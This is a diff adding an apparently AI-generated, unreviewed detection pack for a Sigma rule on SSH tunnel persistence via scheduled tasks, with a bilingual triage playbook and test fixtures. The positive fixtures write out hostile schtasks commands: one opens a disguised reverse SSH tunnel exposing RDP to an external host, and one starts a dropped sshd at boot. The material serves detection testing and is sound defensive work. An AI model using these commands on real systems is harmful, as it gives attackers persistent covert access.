@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "2daa93a0-a5fb-41c5-8cd8-3c11294bfd1f",
+    "title": "Potential SSH Tunnel Persistence Install Using A Scheduled Task",
+    "level": "high",
+    "status": "experimental",
+    "author": "Rory Duncan",
+    "path": "windows/process_creation/proc_creation_win_schtasks_openssh_tunnelling.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_schtasks_openssh_tunnelling.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1053.005"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se usó schtasks.exe para crear una tarea programada que ejecuta ssh.exe con una clave (-i) o sshd.exe con un archivo de configuración (-f). Esto puede indicar persistencia de un túnel SSH inverso hacia un servidor externo.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\schtasks.exe u OriginalFileName es schtasks.exe, y CommandLine contiene ' /create ' junto con 'ssh.exe' y '-i', o 'sshd.exe' y '-f'.",
+      "why_it_matters": "Un túnel SSH inverso programado da al atacante acceso remoto persistente que sobrevive reinicios y evade controles perimetrales, por ejemplo exponiendo RDP. Corresponde a ATT&CK T1053.005 (Scheduled Task) con fines de persistencia y comando y control.",
+      "triage_steps": [
+        "Revise CommandLine completo: nombre de tarea (/tn), disparador (/sc), cuenta (/ru) y el comando de /tr, incluidos destino SSH, puertos y opciones -R, -L o -N.",
+        "Identifique el host remoto del túnel; verifique si la IP o el dominio pertenece a su organización o a un proveedor autorizado.",
+        "Examine ParentImage y el árbol de procesos: cmd.exe, powershell.exe o herramientas de acceso remoto como padre son sospechosos.",
+        "Localice la clave privada indicada con -i o el sshd_config indicado con -f; revise ruta, fecha de creación, autor y hash.",
+        "Busque conexiones de red salientes de ssh.exe o sshd.exe del mismo host, sobre todo al puerto 22 o a puertos no estándar.",
+        "Revise la actividad del mismo usuario y host en +/- 15 minutos: binarios de OpenSSH copiados, creación de cuentas, cambios en el firewall o reconocimiento.",
+        "Consulte alertas previas del host, del usuario y del destino SSH en otros endpoints."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos.",
+        "Administradores que configuran a propósito túneles SSH programados para soporte remoto o monitoreo; confirme con un ticket de cambio y el responsable del sistema.",
+        "Despliegues de sshd con configuración personalizada mediante tarea programada en servidores de laboratorio o de salto."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del sistema si la tarea está autorizada antes de tomar acciones.",
+        "Si no lo está, aísle el endpoint y bloquee el destino SSH en el firewall perimetral.",
+        "Exporte la tarea (schtasks /query /xml) y guarde la clave y la configuración como evidencia; después deshabilite y elimine la tarea.",
+        "Termine los procesos ssh/sshd maliciosos, elimine binarios y claves no autorizados y rote las credenciales expuestas.",
+        "Busque la misma tarea, clave o destino en toda la flota y amplíe la investigación de intrusión."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque es raro que una tarea programada ejecute ssh o sshd con clave o configuración personalizada, y esto da acceso remoto persistente a un atacante."
+    },
+    "en": {
+      "summary": "schtasks.exe created a scheduled task that runs ssh.exe with a key file (-i) or sshd.exe with a config file (-f). This may be a persistent reverse SSH tunnel to an external server.",
+      "what_it_detects": "Process creation events where Image ends with \\schtasks.exe or OriginalFileName is schtasks.exe, and CommandLine contains ' /create ' together with 'ssh.exe' and '-i', or 'sshd.exe' and '-f'.",
+      "why_it_matters": "A scheduled reverse SSH tunnel gives an attacker persistent remote access that survives reboots and bypasses perimeter controls, for example by exposing RDP. Maps to ATT&CK T1053.005 (Scheduled Task) for persistence and command and control.",
+      "triage_steps": [
+        "Read the full CommandLine: task name (/tn), trigger (/sc), run-as account (/ru) and the /tr command, including SSH target, ports and -R, -L or -N options.",
+        "Identify the remote tunnel host; check whether the IP or domain belongs to your organization or an approved vendor.",
+        "Review ParentImage and the process tree; cmd.exe, powershell.exe or remote access tools as parent are suspicious.",
+        "Locate the private key given with -i or the sshd_config given with -f; check path, creation time, owner and hash.",
+        "Look for outbound connections from ssh.exe or sshd.exe on the same host, especially to port 22 or non-standard ports.",
+        "Review the same user and host within +/- 15 minutes: copied OpenSSH binaries, new accounts, firewall changes or reconnaissance.",
+        "Check earlier alerts for the host, the user and the SSH destination on other endpoints."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "Administrators deliberately scheduling SSH tunnels for remote support or monitoring; confirm with a change ticket and the system owner.",
+        "sshd deployments with a custom config via scheduled task on lab or jump servers."
+      ],
+      "response_steps": [
+        "Confirm with the system owner whether the task is authorized before acting.",
+        "If not, isolate the endpoint and block the SSH destination at the perimeter firewall.",
+        "Export the task (schtasks /query /xml) and preserve the key and config as evidence, then disable and delete the task.",
+        "Kill malicious ssh/sshd processes, remove unauthorized binaries and keys, and rotate exposed credentials.",
+        "Hunt for the same task, key or destination across the fleet and widen the intrusion investigation."
+      ],
+      "severity_rationale": "High fits because scheduling ssh or sshd with a custom key or config is rare in normal operations and gives an attacker persistent remote access."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Scheduled task running ssh.exe with a private key to build a reverse tunnel exposing RDP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\schtasks.exe",
+          "OriginalFileName": "schtasks.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "schtasks.exe /create /sc minute /mo 5 /tn \"OneDriveSync\" /ru SYSTEM /tr \"C:\\Windows\\System32\\OpenSSH\\ssh.exe -i C:\\ProgramData\\sync\\key -N -R 8443:127.0.0.1:3389 svc@203.0.113.50\""
+        }
+      },
+      {
+        "description": "Scheduled task starting a dropped sshd.exe with a custom config file at boot",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FS-02.andes.example.com",
+          "User": "ANDES\\adm-mlopez",
+          "Image": "C:\\Windows\\System32\\schtasks.exe",
+          "OriginalFileName": "schtasks.exe",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\schtasks.exe\" /create /tn \"WinSvcHost\" /sc onstart /ru SYSTEM /tr \"C:\\ProgramData\\ssh\\sshd.exe -f C:\\ProgramData\\ssh\\sshd_config\""
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate backup task using scp.exe with a key; neither ssh.exe nor sshd.exe appears in the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-DB-01.andes.example.com",
+          "User": "ANDES\\svc-backup",
+          "Image": "C:\\Windows\\System32\\schtasks.exe",
+          "OriginalFileName": "schtasks.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "schtasks.exe /create /tn \"NightlyBackup\" /sc daily /st 02:00 /tr \"C:\\Windows\\System32\\OpenSSH\\scp.exe -i C:\\Backup\\id_ed25519 C:\\Backup\\db.bak backup@backup.example.com:/srv\""
+        }
+      },
+      {
+        "description": "Administrator running ssh.exe interactively with a key, not through schtasks",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0098.andes.example.com",
+          "User": "ANDES\\rgomez",
+          "Image": "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
+          "OriginalFileName": "ssh.exe",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "ssh.exe -i C:\\Users\\rgomez\\.ssh\\id_ed25519 rgomez@bastion-01.example.com"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
